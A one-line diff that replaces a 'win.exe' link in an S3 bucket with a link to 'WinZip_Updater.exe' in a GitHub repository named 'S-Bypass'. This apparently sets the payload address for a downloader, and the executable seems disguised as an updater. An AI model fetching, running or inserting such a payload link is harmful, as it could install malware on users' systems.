@@ -1,1 +1,1 @@
-https://testtststs.s3.ap-south-1.amazonaws.com/win.exe
+https://github.com/XSUP4EME/S-Bypass/raw/refs/heads/main/WinZip_Updater.exe
